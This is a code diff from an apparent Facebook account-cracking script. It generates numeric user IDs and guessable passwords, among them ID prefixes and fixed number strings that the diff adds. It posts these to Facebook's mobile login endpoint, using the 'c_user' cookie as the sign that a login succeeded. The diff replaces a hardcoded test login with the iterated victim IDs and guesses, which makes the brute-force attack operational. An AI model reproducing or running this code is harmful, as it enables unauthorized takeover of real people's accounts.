@@ -1140,7 +1140,7 @@ def SUMON2():
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
-            pwx = [uid[:6], uid,mk]
+            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -2094,10 +2094,10 @@ def freeq(uid,pwx,tl):
             data ={
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'email': '61566172784110',
+            'email': uid,
             'next': 'https://m.facebook.com/login/save-device/',
             'flow': 'login_no_pin',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], 'sumon@12M'),
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
             headers = {
             "Host": "m.facebook.com",
@@ -2125,7 +2125,7 @@ def freeq(uid,pwx,tl):
             "Accept-Language": "en,en-US;q=0.9",
             "DNT": "1",}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = ses.post(url, data=data, headers=headers).text
             response = ses.cookies.get_dict().keys()
             if "c_user" in response:
